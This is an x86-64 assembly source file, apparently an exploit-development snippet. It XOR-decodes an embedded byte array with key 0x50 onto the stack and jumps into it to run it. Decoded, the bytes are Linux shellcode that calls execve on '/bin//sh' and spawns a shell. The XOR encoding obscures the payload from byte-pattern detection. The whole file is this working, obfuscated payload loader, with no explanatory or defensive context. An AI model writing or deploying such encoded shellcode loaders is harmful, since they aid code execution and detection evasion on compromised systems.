

section .text
	global main

	main:
		sub rsp, 33	; allocate space on stack
		xor rcx, rcx    ; init counter
		mov r8b, 0x50 	; key
		
; --------------------------------------------------------------------

	unpack:	
		mov r10b, byte[packed+rcx]
		xor r10b, r8b
		mov byte[rsp+rcx], r10b
		inc rcx
		cmp rcx, packed_len
		jne unpack
	
; --------------------------------------------------------------------

	execute_me:
		mov rbx, rsp
		jmp rbx



section .data
	packed db 0x18, 0x61, 0x90, 0x0, 0x18, 0xe8, 0x7f, 0x32, 0x39, 0x3e, 0x7f, 0x7f, 0x23, 0x38, 0x0, 0x18, 0xd9, 0xb7, 0x18, 0x61, 0xa6, 0x18, 0x61, 0x82, 0x18, 0x61, 0x90, 0x18, 0xd3, 0x90, 0x6b, 0x5f, 0x55
	packed_len equ $-packed
